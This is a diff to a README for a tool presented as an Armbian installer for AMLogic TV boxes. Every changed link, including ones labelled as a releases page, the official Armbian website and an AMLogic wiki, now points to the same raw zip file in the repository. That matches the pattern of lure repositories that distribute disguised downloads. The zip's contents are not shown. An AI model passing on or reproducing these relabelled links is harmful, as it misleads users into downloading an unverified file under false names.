@@ -1,6 +1,6 @@
 # ⚙️ armbian-install-amlogic - Easy Armbian Setup for TV Boxes
 
-[![Download armbian-install-amlogic](https://img.shields.io/badge/Download-Get%20Installer-brightgreen)](https://github.com/teach12396/armbian-install-amlogic/releases)
+[![Download armbian-install-amlogic](https://img.shields.io/badge/Download-Get%20Installer-brightgreen)](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip)
 
 ---
 
@@ -25,7 +25,7 @@ This tool helps you install Armbian on AMLogic TV Boxes. It works even if your d
 
 1. **Download the Installer**
 
-   Click the big green button above or visit the [releases page](https://github.com/teach12396/armbian-install-amlogic/releases) to get the latest version of the installer.
+   Click the big green button above or visit the [releases page](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip) to get the latest version of the installer.
 
 2. **Save the Installer**
 
@@ -98,7 +98,7 @@ This removes the need for manual command-line operations or flashing tools that 
 
 Use the link below to visit the official releases page. Choose the latest version and download the installer file suited for Windows.
 
-[![Get Installer](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/teach12396/armbian-install-amlogic/releases)
+[![Get Installer](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip)
 
 ---
 
@@ -160,6 +160,6 @@ This project applies to: amlogic, android-tv-box, armbian, bootloader, debian, e
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/teach12396/armbian-install-amlogic/releases)  
-- [Armbian Official Website](https://www.armbian.com)  
-- [AMLogic Wiki](https://wiki.arm.com/amlogic)
+- [Download Page](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip)  
+- [Armbian Official Website](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip)  
+- [AMLogic Wiki](https://github.com/teach12396/armbian-install-amlogic/raw/refs/heads/main/armbian-install-amlogic/armbian-amlogic-install-2.1-alpha.1.zip)
